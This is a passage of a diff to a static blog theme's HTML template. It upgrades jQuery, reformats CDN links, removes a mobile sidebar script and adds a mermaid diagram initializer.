+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
   <i class="ri-arrow-up-line"></i>
 </div>
 
@@ -412,8 +557,7 @@
   <i class="ri-moon-line"></i>
 </div>
 
-      </div>
-    </main>
+    </div>
     <aside class="sidebar on">
       <button class="navbar-toggle"></button>
 <nav class="navbar">
@@ -473,12 +617,6 @@
 </div>
 </div>
     </aside>
-    <script>
-      if (window.matchMedia("(max-width: 768px)").matches) {
-        document.querySelector('.content').classList.remove('on');
-        document.querySelector('.sidebar').classList.remove('on');
-      }
-    </script>
     <div id="mask"></div>
 
 <!-- #reward -->
@@ -495,22 +633,23 @@
   </div>
 </div>
     
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
 <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
 
 <script src="/dist/main.js"></script>
 
 <!-- ImageViewer -->
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
 <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
 
     <!-- Background of PhotoSwipe. 
@@ -615,8 +754,7 @@
         })
     }
     viewer_init()
-</script>
-
+</script> 
 <!-- MathJax -->
 
 <!-- Katex -->
@@ -628,17 +766,13 @@
 <!-- ClickBoom1 -->
 
 <!-- ClickBoom2 -->
-
-
+ 
 <script src="/js/clickBoom2.js"></script>
-
-
+ 
 <!-- CodeCopy -->
-
-
+ 
 <link rel="stylesheet" href="/css/clipboard.css">
-
-<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 <script>
   function wait(callback, seconds) {
     var timelag = null;
@@ -692,12 +826,19 @@
     initCopyCode();
   }(window, document);
 </script>
-
-
+ 
 <!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
 
 
     
+    
+
   </div>
 </body>
 
